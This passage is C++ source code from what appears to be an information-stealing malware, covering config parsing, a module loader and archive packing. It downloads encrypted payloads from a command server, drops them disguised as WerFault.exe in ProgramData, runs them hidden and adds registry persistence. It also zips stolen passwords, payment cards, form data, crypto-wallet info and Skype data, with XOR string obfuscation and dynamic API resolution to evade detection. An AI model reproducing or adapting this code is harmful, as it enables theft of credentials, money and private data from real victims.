							rule.systemType = (SystemType)(str2ull(temp[2]) == 0 ? 1 : str2ull(temp[2]));
							rule.args = temp[5];
							rule.launchOption = str2ull(temp[6]);
							splitBy(trimStr(temp[7], ' '), ',', rule.onlyDomains);
							rule.cryptoOnly = BOOL_STR(temp[8]);
							rule.addAutoStart = BOOL_STR(temp[9]);
							rule.launchAsAdmin = BOOL_STR(temp[10]);
							rule.randomName = BOOL_STR(temp[11]);
							rule.repeat = BOOL_STR(temp[12]);
							rule.id = str2ull(temp[13]);

							rule.active = rule.onlyDomains.empty();
							rules.push_back(rule);
						}
					}
				}
				else
					grabber.iStatus = 0;
			}
			else
				grabber.iStatus = 0;

			if (config.size() >= 5)
			{
				if (config[4] != XOR("[]"))
				{
					config[4] = config[4].substr(1).substr(0, config[4].size() - 2);
					splitBy(config[4], ':', modules);
				}
			}
		}

		return grabber;
	}
	catch (...) { return grabber; }
}

void Stealing::ProcessModules(const string & url)
{
	try
	{
		const string protocol = port == INTERNET_DEFAULT_HTTP_PORT ? XOR("http://") : XOR("https://");
		for (size_t i = 0; i < modules.size(); ++i)
		{
			Loader ldr;

			string settings = string();
			ldr.DownloadFile(protocol + url + XOR("/api/") + modules[i] + XOR(".get"), settings);
			if (!settings.empty())
			{
				string file = string();
				ldr.DownloadFile(protocol + url + XOR("/api/") + modules[i] + XOR(".post"), file);
				// delete ldr;

				file = base64_decode(file);				
				if (!file.empty())
				{
					RC4(file, url);
					if (file[0] == 'M' && file[1] == 'Z')
					{
						char* kernel32 = XOR("Kernel32.dll");
						
						const string fullPath = string(getenv(XOR("ProgramData"))) + '\\' + random_string(5);
						const string exePath = fullPath + XOR("\\WerFault.exe");
						
						if (!File.dirInstance()->Exists(fullPath))
							File.dirInstance()->Create(fullPath);
						else
							continue;

						HANDLE hFile = FNC(CreateFileA, kernel32)(exePath.c_str(), XorInt(GENERIC_READ) | XorInt(GENERIC_WRITE), 0, 0,
							CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
						if (hFile != INVALID_HANDLE_VALUE)
						{
							DWORD dwRes = 0;
							FNC(WriteFile, kernel32)(hFile, file.c_str(), file.size(), &dwRes, 0);
							FNC(CloseHandle, kernel32)(hFile);

							if (file.size() == dwRes)
							{
								file.clear();

								Module(exePath, settings);
								FNC(ShellExecuteA, XOR("Shell32.dll"))(0, 0, exePath.c_str(), 0, 0, SW_HIDE);

								Module::RegistryPersistance(fullPath);
							}
						}
					}
				}
			}
		}
	}
	catch (...) { return; }
}

void Stealing::Complete()
{
	try
	{
		if (!pass.output.empty())
			zip.addFileMemory(pass.path, pass.output);
		else
			passwords = 0;
		if (!card.output.empty())
			zip.addFileMemory(card.path, card.output);
		else
			cards = 0;
		if (!form.output.empty())
			zip.addFileMemory(form.path, form.output);
		else
			forms = 0;

		if (!log.output.empty())
			zip.addFileMemory(log.path, log.output);

		if (!browserVersion.output.empty())
			zip.addFileMemory(browserVersion.path, browserVersion.output);

		if (!solution.output.empty())
			zip.addFileMemory(solution.path, solution.output);

		if (!walletInfo.output.empty())
			zip.addFileMemory(walletInfo.path, walletInfo.output);

		if (!skype.output.empty())
		{
			zip.addFolder(skype.path);
			zip.addFileMemory(skype.path + XOR("\\Skype.txt"), skype.output);
		}

		char* buff = (char*)malloc(1);
		unsigned long data = zip.data((void**)&buff);
		buff = (char*)malloc(data);
		data = zip.data((void**)&buff);
		archiveBytes = string(buff, data);
		free(buff);
		zip.~ZipWrapper();
	}
	catch (...) { return; }
}

string Stealing::GetQuery(const string & key)
{
	try
	{
		string res = string();
		for (int i = 0; i < rules.size(); ++i)
		{
			res += std::to_string(rules[i].id);
			res += ',';
		}
		if (!res.empty())
			res.pop_back();
		res += '|';
		res += windows_version;
		
		RC4(res, key);
		return base64_encode(res);
	}
	catch (...) { return string(); }
}